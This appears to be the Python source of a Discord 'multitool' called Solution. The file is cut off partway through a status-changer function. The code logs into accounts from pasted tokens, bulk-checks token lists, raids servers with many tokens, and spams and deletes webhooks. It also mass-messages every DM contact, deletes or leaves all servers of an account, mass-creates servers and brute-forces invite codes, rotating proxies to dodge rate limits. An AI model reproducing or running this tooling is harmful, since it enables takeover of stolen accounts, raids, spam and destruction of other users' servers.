from asyncio.events import get_running_loop
from selenium.webdriver.support.wait import WebDriverWait
from GradientGen import PrintLinearGradient
from selenium import webdriver
from colored import fg, attr
from colorama import Fore
from threading import Thread
from datetime import datetime, date
from pypresence import Presence
from random import randint
from itertools import cycle
import requests, os, time, json, ctypes, random, string, discord, subprocess, stdiomask, getpass, hashlib
reset = attr('reset')
fblue = Fore.BLUE
cyan = fg("#00ffdd")
red = fg("#FF0202")
green = fg("#11FF02")
print(f"{fblue}╔════[root@solution]\n╚══► Checking For Updates!...{cyan}")
try:
    from asyncio.events import get_running_loop
    from selenium.webdriver.support.wait import WebDriverWait
    from GradientGen import PrintLinearGradient
    from selenium import webdriver
    from colored import fg, attr
    from colorama import Fore
    from threading import Thread
    from datetime import datetime, date
    from pypresence import Presence
    from random import randint
    from itertools import cycle
    import requests, os, time, json, ctypes, random, string, discord, subprocess, stdiomask, getpass, hashlib
except:
    os.system("pip install asyncio")
    os.system("pip install selenium")
    os.system("pip install requests")
    os.system("pip install discord")
    os.system("pip install discord.py")
    os.system("pip install pypresence")
    os.system("pip install colour")
    os.system("pip install stdiomask")
ctypes.windll.kernel32.SetConsoleTitleW(f"🪐Solution | Checking For Updates!...")
dsctime = time.time()
versionnumber = 1.99
version = f"v{versionnumber}"
getallinfos = requests.get("")
hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
try:
    text = getallinfos.text
    w = open("temp.txt", "a+")
    w.write(text)
    w.close()
    with open("temp.txt") as f:
        for line in f:
            if "infos" in line:
                allinfos = line
    os.remove("temp.txt")
    infokekr = allinfos.split("|")
    
except:
    exit()

try:
    try:
        os.system("cls")
        rpc = Presence("897136712994656276")
        rpc.connect()   
        rpc.update(state="Idling",details=f"{version} ~ Dev: Nico.#1559",large_image = 'solutionpb',buttons=[{"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}],start=dsctime)
    except:
        os.system("clear")
        rpc = Presence("897136712994656276")
        rpc.connect()   
        rpc.update(state="Idling",details=f"{version} ~ Dev: Nico.#1559",large_image = 'solutionpb',buttons=[{"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}],start=dsctime)
except:
    print(f"{red}Couldnt Find Running Discord Exe.")
    time.sleep(2)

logo_layer0 = ""
logo_layer1 = "    .▄▄ ·       ▄▄▌  ▄• ▄▌▄▄▄▄▄▪         ▐ ▄ "
logo_layer2 = "    ▐█ ▀. ▪     ██•  █▪██▌•██  ██ ▪     •█▌▐█"
logo_layer3 = "    ▄▀▀▀█▄ ▄█▀▄ ██▪  █▌▐█▌ ▐█.▪▐█· ▄█▀▄ ▐█▐▐▌"
logo_layer4 = "    ▐█▄▪▐█▐█▌.▐▌▐█▌▐▌▐█▄█▌ ▐█▌·▐█▌▐█▌.▐▌██▐█▌"
logo_layer5 = "     ▀▀▀▀  ▀█▄▀▪.▀▀▀  ▀▀▀  ▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪"
logo_layer6 = "╔═══════════✶ #1 Discord  MultiTool ✶═══════════╗"
logo_layer7 = "╠═══════════════════════════════════════════════╣"

token = ""
sent = 0
spm = 0
retryafter = 0
delay = 0
listlength = 0
valid = 0
invalid = 0
badtoken = 0
goodtoken = 0
error = 0
generated = 0
authedtoken = 0
joined = 0
#colors:

client = discord.Client()
expiryremaining  = ""
username = ""
userrrank = ""


allowthreading = True



def resetvalues():
    global sent, spm, retryafter, delay, listlength, valid, invalid, error, generated, badtoken, goodtoken, authedtoken, joined, token
    token = ""
    sent = 0
    spm = 0
    retryafter = 0
    delay = 0
    listlength = 0
    valid = 0
    invalid = 0
    error = 0
    generated = 0
    badtoken = 0
    goodtoken = 0
    authedtoken = 0
    joined = 0


    

def webhookspm():
    global spm
    while allowthreading == True:
        if sent >= 1:
            now = sent
            time.sleep(4)
            spm = (sent - now) * 15
def webhooktitle():
    while allowthreading == True:
        ctypes.windll.kernel32.SetConsoleTitleW(f"🪐Solution | Sent: {sent} | SPM: {spm} | Delay: {delay}s | Retry in {retryafter}ms")
def invitegen():
    global generated, allowthreading
    allowthreading = True
    generated = 0
    amount = input(f"{fblue}╔════[Enter Quantity]\n╚══► {cyan}")
    PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► Generating...")
    gentime = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    for x in range(int(amount)):
        code = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(6)])
        y = open(f"output/gen_invites[{gentime}].txt", "a")
        y.write(f"https://discord.gg/{code}\n")
        y.close()
        generated += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f"🪐Solution | Generated: {generated} ")
        try:
            rpc.update(state=f"Generated {generated} Invite/s", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[{"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
        except:
            pass
    PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► Successfully Generated {amount} Invite/s.")
    time.sleep(2)
    menu()
def invitecheckerworker():
    while allowthreading == True:
        try:
            checked = valid+invalid
            progx = checked / listlength * 100
            progy = (str(float(progx)))
            progress = progy[0:5]
        except:
            progress = 0
        try:
            rate_value_two = valid+invalid / valid
            rate_value_twy = (str(float(rate_value_two)))
            rate_value_two = rate_value_twy[0:4]
            ratio = f"1:{rate_value_two}"
        except:
            ratio = f"1:0"
        ctypes.windll.kernel32.SetConsoleTitleW(f"🪐Solution | Progress: {progress}% | Ratio: {ratio} | Checked: {checked}/{listlength} | Valid: {valid} | Invalid: {invalid} | Errors: {error} ")
def invitechecker():
    global listlength, valid, invalid, error, allowthreading
    allowthreading = True
    currentproxy = 0
    proxylist = []
    listname = input(f"{fblue}╔════[Enter List]\n╚══► {cyan}")
    listx = open(listname, "r").read().splitlines()
    for line in listx:
        listlength += 1  
    proxylistname = input(f"{fblue}╔════[Enter Proxylist(HTTPS) ~ empty for no proxies]\n╚══► {cyan}")
    if proxylistname == "":
        proxies = {"https://": None}
    else:
        with open(proxylistname, "r") as xf:
            for line in xf:
                proxylist.append(line)
        proxies = {"https://": "https://"+proxylist[currentproxy]}
    
    delay = int(input(f"{fblue}╔════[Enter Delay in s ~ 1-5s Recommendet]\n╚══► {cyan}"))
    Thread(target=invitecheckerworker).start()
    gentime = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    for line in listx:
        try:
            if "/" in line:
                invite = line.split("/")[-1]
            else:
                invite = line
            try:
                tooreexiscool = requests.get(f"https://canary.discord.com/api/v6/invite/{invite}?with_counts=true", proxies=proxies)
                if tooreexiscool.status_code == 200:
                    infokekr = json.loads(tooreexiscool.text) # "
                    PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► Name: {infokekr['guild']['name']}{reset} | Members: {infokekr['approximate_member_count']} | Link: {infokekr['code']}")
                    with open(f"output/Working_Invites[{gentime}].txt", "a+") as out:
                        out.write(line)
                    out.close
                    time.sleep(delay)
                    valid += 1
                elif tooreexiscool.status_code == 404:
                    file = open(listname, "rt")
                    data = file.read()
                    data = data.replace(f"{invite}", "")
                    file.close()
                    fin = open(listname, "wt")
                    fin.write(data)
                    fin.close()
                    time.sleep(delay)
                    invalid += 1
                    pass
                elif tooreexiscool.status_code == 429:
                    error += 1
                    currentproxy += 1
                    if proxylistname == "":
                        PrintLinearGradient("#0400ff", "#00ffdd", f"Ratelimited! Change VPN -> Sleeping 120s")
                        time.sleep(120)    
                    else:
                        print(f"Ratelimited! {proxylist[currentproxy]} -> Changing Proxy ")
                        time.sleep(delay)
                else:
                    PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Cant indentify status code! {tooreexiscool.status_code}")
                    time.sleep(delay)
                    pass
                try:
                    rpc.update(state=f"Checking Invites {valid+invalid}/{listlength}", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[{"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
                except:
                    pass            
            except KeyboardInterrupt:
                menu()
            except Exception as e:
                PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] {e}")
                time.sleep(delay)
        except KeyboardInterrupt:
            menu()
    menu()
def tokenlogin():
    try:
        rpc.update(state="Just logged into a token💀", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
                {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
    try:
        options = webdriver.ChromeOptions()
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_argument('window-size=1000,900')
        driver = webdriver.Chrome(options=options, executable_path=r"chromedriver.exe")
        wait = WebDriverWait(driver, 30)
        driver.get("https://discord.com/login")
        time.sleep(7)
        driver.execute_script("""function login(token) {
        setInterval(() => {
        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
        }, 50);
        setTimeout(() => {
        location.reload();
        }, 2500);
        }
        login('"""+token+"')")
        wait.until(driver.find_elements_by_class_name("nameAndDecorators-5FJ2dg"))
        menu()
    except:
        menu()
def webhookspammer():
    try:
        rpc.update(state="Destroying a Webhook🌌", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
                {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    global sent, retryafter, delay, allowthreading
    sent = 0
    webhook = input(f"{fblue}╔════[Enter Webhook]\n╚══► {cyan}")
    msg = input(f"{fblue}╔════[Enter Message]\n╚══► {cyan}")
    delay = float(input(f"{fblue}╔════[Enter Delay in s ~ Lowest 0]\n╚══► {cyan}"))
    try:
        allowthreading = True
        Thread(target=webhookspm).start()
        Thread(target=webhooktitle).start()
        while True:
            try:
                time.sleep(delay)
                data = requests.post(webhook, json={'content': msg})
                try:
                    dataload = data.json()
                except:
                    pass
                if data.status_code == 204:
                    sent += 1
                    PrintLinearGradient("#0400ff", "#00ffdd", f"[+] Message Sent. <<{sent}>>")
                elif dataload['message'] == "You are being rate limited.":
                    retryafter = dataload['retry_after']
                    PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Ratelimited! Retry in {retryafter}ms")
                    time.sleep(retryafter/10000)
            except Exception as e:
                PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] {e}!")
                time.sleep(1.5)
                menu()
    except KeyboardInterrupt:
        menu()
    except Exception as e:
        PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] {e}!")
        time.sleep(1.5)
        menu()
def webhookdeleter():
    try:
        rpc.update(state="Deleted a Webhook😂", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
                {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    webhook = input(f"{fblue}╔════[Enter Webhook]\n╚══► {cyan}")
    x = requests.delete(webhook)
    if x.status_code == 204:
        PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► Successfully Deleted!")
        time.sleep(2)
        menu()
    else:
        PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Failed Deleting Webhook!")
        time.sleep(2)
        menu()
def tokentitleworker():
    while allowthreading == True:
        try:
            checked = badtoken+goodtoken+authedtoken
            progx = checked / listlength * 100
            progy = (str(float(progx)))
            progress = progy[0:5]
        except:
            progress = 0
        try:
            rate_value_two = badtoken+goodtoken+authedtoken / goodtoken
            rate_value_twy = (str(float(rate_value_two)))
            ratio = f"1:{rate_value_two}"
        except:
            ratio = f"1:0"
        ctypes.windll.kernel32.SetConsoleTitleW(f"🪐Solution | Progress: {progress}% | Ratio: {ratio} | Checked: {checked}/{listlength} | Valid: {goodtoken} | Invalid: {badtoken} | 2FA: {authedtoken} | Errors: {error} ")
def tokenchecker():
    global badtoken, goodtoken, allowthreading, error, listlength, authedtoken
    allowthreading = True
    xd = []
    tokenfile = input(f"{fblue}╔════[Enter Token file]\n╚══► {cyan}")
    xl = open(tokenfile, "r").read().splitlines()
    for line in xl:
        listlength += 1
        xd.append(line)
    PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► Loaded {listlength} Token/s.")
    removechecked = input(f"{fblue}╔════[Remove Checked Tokens From File? y/n]\n╚══► {cyan}").lower()
    delay = int(input(f"{fblue}╔════[Enter Delay in s ~ Recommendet 1/2s]\n╚══► {cyan}"))
    Thread(target=tokentitleworker).start()
    gentime = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    for line in xd:
        token = line
        try:
            time.sleep(delay)
            cauth = requests.post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
            if "y" in removechecked:
                file = open(tokenfile, "rt")
                data = file.read()
                data = data.replace(f"{token}", "")
                file.close()
                fin = open(tokenfile, "wt")
                fin.write(data)
                fin.close()
            else:
                pass
            if cauth.status_code == 401:
                badtoken += 1
                y = open(f"output/bad_tokens[{gentime}].txt", "a")
                y.write(f"{token}\n")
                y.close()
            elif cauth.status_code == 429:
                PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Ratelimited! Change VPN/Proxy ~ sleeping 60s")
                error += 1
                time.sleep(60)
            elif "You need to verify your account in order to perform this action." in str(cauth.content):
                authedtoken += 1
                y = open(f"output/2fa_tokens[{gentime}].txt", "a")
                y.write(f"{token}\n")
                y.close()
            else:
                goodtoken += 1
                PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► [WORKING] {token}")
                y = open(f"output/working_tokens[{gentime}].txt", "a")
                y.write(f"{token}\n")
                y.close()
            try:
                rpc.update(state=f"Checking Tokens: {badtoken+goodtoken}/{listlength}", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
                    {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
            except:
                pass
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] {e}")
    menu()
def onetokenoneserver():
    token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
    inputinvite = input(f"{fblue}╔════[Enter Invite]\n╚══► {cyan}")
    invite = inputinvite.split("/")[-1]
    joiner = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers={'Authorization': token})
    if joiner.status_code == 200:
        serverinfos = json.loads(joiner.text)
        PrintLinearGradient("#0400ff", "#00ffdd",f"[SUCCESS] Joined {serverinfos['guild']['name']}")
        time.sleep(2)
        menu()
    if joiner.status_code == 429:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Change VPN to join server.")
        time.sleep(2)
        menu()
    else:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Failed Joining {invite}")
        time.sleep(2)
        menu()
def onetokenserversworker():
    while allowthreading == True:
        try:
            checked = valid+invalid
            progx = checked / listlength * 100
            progy = (str(float(progx)))
            progress = progy[0:5]
        except:
            progress = 0
        try:
            rate_value_two = valid+invalid / valid
            ratio = f"1:{rate_value_two}"
        except:
            ratio = f"1:0"
        ctypes.windll.kernel32.SetConsoleTitleW(
            f"🪐Solution | Progress: {progress}% | Ratio: {ratio} | Checked: {checked}/{listlength} | Valid: {valid} | Invalid: {invalid} | Errors: {error} ")
def onetokenservers():
    try:
        rpc.update(state="Joining Servers🥱", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
                {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    global listlength, valid, invalid, error, allowthreading
    allowthreading = True
    invites = []
    token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
    inputinvite = input(f"{fblue}╔════[Enter Invites File]\n╚══► {cyan}")
    delay = int(input(f"{fblue}╔════[Enter Delay in s ~ min. 40s]\n╚══► {cyan}"))
    if delay < 40:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Undercutted lowest delay!")
        time.sleep(2)
        menu()
    xy = open(inputinvite, "r").read().splitlines()
    for line in xy:
        listlength +=1
        invites.append(line)
    Thread(targer=onetokenserversworker).start()
    for line in invites:
        try:
            invite = line.split("/")[-1]
            joiner = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers={'Authorization': token})
            if joiner.status_code == 200:
                serverinfos = json.loads(joiner.text)
                PrintLinearGradient("#0400ff", "#00ffdd",f"[SUCCESS] Joined {serverinfos['guild']['name']}")
                valid += 1
                time.sleep(delay)
            if joiner.status_code == 429:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Change VPN/Proxy")
                error += 1
                time.sleep()
            else:
                invalid += 1
                time.sleep(delay)
        except KeyboardInterrupt:
            menu()
    menu()
def onetokenserversratio():
    try:
        rpc.update(state="Joining Servers", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    global listlength, valid, invalid, error, allowthreading
    allowthreading = True
    invites = []
    token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
    inputinvite = input(f"{fblue}╔════[Enter Invites File]\n╚══► {cyan}")
    minmember = int(input(f"{fblue}╔════[Enter Min. member count]\n╚══► {cyan}"))
    maxmember= int(input(f"{fblue}╔════[Enter Max. member count]\n╚══► {cyan}"))
    delay = int(input(f"{fblue}╔════[Enter Delay in s ~ min. 40s]\n╚══► {cyan}"))
    if delay < 40:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Undercutted lowest delay!")
        time.sleep(2)
        menu()
    xy = open(inputinvite, "r").read().splitlines()
    for line in xy:
        listlength +=1
        invites.append(line)
    Thread(targer=onetokenserversworker).start()
    for line in invites:
        try:
            invite = line.split("/")[-1]
            tooreexiscool = requests.get(f"https://canary.discord.com/api/v6/invite/{invite}?with_counts=true")
            if tooreexiscool.status_code == 200:
                infokekr = json.loads(tooreexiscool.text)
                if infokekr['approximate_member_count'] > minmember and infokekr['approximate_member_count'] < maxmember:
                    joiner = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers={'Authorization': token})
                    if joiner.status_code == 200:
                        serverinfos = json.loads(joiner.text)
                        PrintLinearGradient("#0400ff", "#00ffdd",f"[SUCCESS] Joined {serverinfos['guild']['name']}")
                        valid += 1
                        time.sleep(delay)
                    elif joiner.status_code == 429:
                        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Change VPN/Proxy")
                        error += 1
                        time.sleep(delay)
                    else:
                        invalid += 1
                        time.sleep(delay)
            elif tooreexiscool.status_code == 429:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Change VPN/Proxy")
                time.sleep(2)
            else:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] CRITICAL ERROR!")
                time.sleep(2)
        except KeyboardInterrupt:
            menu()
    menu()
def tokensoneserverworker():
    while allowthreading == True:
        try:
            checked = joined
            progx = checked / listlength * 100
            progy = (str(float(progx)))
            progress = progy[0:5]
        except:
            progress = 0
        ctypes.windll.kernel32.SetConsoleTitleW(f"🪐Solution | Progress: {progress}% | Joined: {checked}/{listlength} | Valid: {joined} | Invalid: {invalid} | Errors: {error} ")
def tokensoneserver():
    try:
        rpc.update(state="Raiding Someone🥱", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
                {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    global listlength, allowthreading, error, joined, invalid
    allowthreading = True
    tokens = []
    tokenfile = input(f"{fblue}╔════[Enter Token file]\n╚══► {cyan}")
    invitexs = input(f"{fblue}╔════[Enter Invite]\n╚══► {cyan}")
    invite = invitexs.split("/")[-1]
    delay = int(input(f"{fblue}╔════[Enter Delay in s ~ lowest 0s]\n╚══► {cyan}"))
    xy = open(tokenfile, "r").read().splitlines()
    for line in xy:
        listlength +=1
        tokens.append(line)
    Thread(target=tokensoneserverworker).start()
    for line in tokens:
        try:
            joiner = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers={'Authorization': line})
            if joiner.status_code == 200:
                serverinfos = json.loads(joiner.text)
                PrintLinearGradient("#0400ff", "#00ffdd",f"[SUCCESS] Joined {serverinfos['guild']['name']}")
                joined += 1
                time.sleep(delay)
            elif joiner.status_code == 429:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Change VPN/Proxy")
                error += 1
                time.sleep(delay)
            else:
                invalid += 1
                time.sleep(delay)
        except KeyboardInterrupt:
            menu()
    menu()
def tokenmassleaverworker():
    while allowthreading == True:
        try:
            checked = valid
            progx = checked / listlength * 100
            progy = (str(float(progx)))
            progress = progy[0:5]
        except:
            progress = 0
        ctypes.windll.kernel32.SetConsoleTitleW(f"🪐Solution | Progress: {progress}% | Left: {checked}/{listlength} | Errors: {error} ")
def tokenmassleaver():
    try:
        rpc.update(state="Cleaning Up a Raid🥱", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
                {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    global listlength, error, valid, allowthreading
    allowthreading = True
    tokens = []
    tokenfile = input(f"{fblue}╔════[Enter Token file]\n╚══► {cyan}")
    inviteid = input(f"{fblue}╔════[Enter server ID]\n╚══► {cyan}")
    delay = int(input(f"{fblue}╔════[Enter Delay in s ~ lowest 0s]\n╚══► {cyan}"))
    xy = open(tokenfile, "r").read().splitlines()
    for line in xy:
        listlength +=1
        tokens.append(line)
    Thread(target=tokenmassleaverworker).start()
    for line in tokens:
        try:
            time.sleep(delay)
            headers={'Authorization': line}
            r = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{inviteid}", headers=headers)
            if r.status_code == 200:
                PrintLinearGradient("#0400ff", "#00ffdd",f"╚══► [SUCCESS] Left Server!")
                valid += 1
            elif r.status_code == 429:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Change VPN/Proxy")
                error += 1
            else:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Failed Leaving Server!")
                error += 1
        except KeyboardInterrupt:
            menu()
    menu()
def tokenleaveall():
    try:
        rpc.update(state="Cleaning Up a Token🥱", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    global client, token
    xd = 0
    left = 0
    
    try:
        token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
        headers = {'Authorization': token,
                   'content-type': 'application/json',
                   'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'}
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
        else:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Invalid Token!")
            time.sleep(2)
            menu()
    except Exception as e:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
        time.sleep(2)
        menu()
    ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName}')
    guildsIds = requests.get("https://canary.discord.com/api/v8/users/@me/guilds", headers=headers).json()
    for guild in guildsIds:
        xd += 1
    for guild in guildsIds:
        try:
            x = requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers=headers)
            if x.status_code == 204:
                PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► [DELETED] {guild['id']}")
                left += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Left: {left}/{xd}')
            elif x.status_code == 403:
                ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Left: {left}/{xd}')
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
            time.sleep(2)
            menu()
    headerx = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
    guildsIdsx = requests.get("https://canary.discord.com/api/v8/users/@me/guilds", headers=headers).json()
    for guild in guildsIdsx:
        try:
            x = requests.delete(f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}", headers=headerx)
            print(x.text)
            print(x.status_code)
            if x.status_code == 204:
                PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► [LEFT] {guild['id']}")
                left += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Left: {left}/{xd}')
            elif x.status_code == 403:
                ctypes.windll.kernel32.SetConsoleTitleW(
                    f'🪐Solution | Connected ~> {userName} | Left: {left}/{xd}')
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
            time.sleep(2)
    menu()
def tokendmall():
    try:
        rpc.update(state="Spams mass DMs😂", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    xdl = 0
    dmed = 0
    try:
        token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
        headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
        else:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Invalid Token!")
            time.sleep(2)
            menu()
    except Exception as e:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
        time.sleep(2)
        menu()
    ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName}')
    try:
        sm = input(f"{fblue}╔════[Enter Message To Dm All]\n╚══► {cyan}")
        dmids = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=headers).json()
        for channel in dmids:
            xdl += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Loaded {xdl} Channel/s')
        json = {"content": f"{sm}"}
        for channel in dmids:
            try:
                x = requests.post(f'https://discord.com/api/v8/channels/{channel["id"]}/messages',headers=headers,data=json)
                print(x.text)
                print(x.status_code)
                PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► [SUCCESS] Successfully Dmed ~> {channel}")
                dmed += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Sent: {dmed}/{xdl}')
            except:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] CANT Dm ~> {channel}")
        menu()
    except KeyboardInterrupt:
        menu()
    except Exception as e:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
def tokenservercreate():
    try:
        rpc.update(state="Mass Creates Server😂", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    xdl = 0
    try:
        token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
        headers = {'Authorization': token,
                   'content-type': 'application/json',
                   'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'}
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName}')
        else:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Invalid Token!")
            time.sleep(2)
            menu()
    except Exception as e:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
        time.sleep(2)
        menu()
    namez = input(f"{fblue}╔════[Enter Server Names]\n╚══► {cyan}")
    guilicon = input(f"{fblue}╔════[Enter Server icon(Url) ~ Leave blank for none]\n╚══► {cyan}")
    amount = input(f"{fblue}╔════[Enter Amount of Servers to create]\n╚══► {cyan}")
    if guilicon.startswith('https://'):
        payload = {
            'name': f"{namez}",
            'region': 'europe',
            'icon': f'{guilicon}',
            'channels': None
        }
    else:
        payload = {
            'name': f"{namez}",
            'region': 'europe',
            'icon': None,
            'channels': None
        } 
    for i in range(int(amount)):
        try:
            xdl += 1
            r = requests.post('https://discord.com/api/v6/guilds',headers=headers, json=payload)
            if r.status_code == 201:
                PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► [SUCCESS] Created {namez} ({xdl})")
                ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Created: {xdl}')
            elif r.status_code == 429:
                dataload = r.json()
                retryafter = dataload['retry_after']
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Sleeping {retryafter}ms")
                time.sleep(retryafter/10000)
            else:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Some weird error idk contact Nico.#1559 on discord")
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
    menu()
def tokenstatuschanger():
    try:
        rpc.update(state="Changing Someones Status😂", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
    status = input(f"{fblue}╔════[Change Status To]\n╚══► {cyan}")
    try:
        customStatus = {"custom_status": {"text": status}} #{"text": Status, "emoji_name": "☢"} if you want to add an emoji to the status
        r = requests.patch("https://discord.com/api/v8/users/@me/settings", headers={"Authorization": token}, json=customStatus)
        if r.status_code == 429:
            dataload = r.json()
            retryafter = dataload['retry_after']
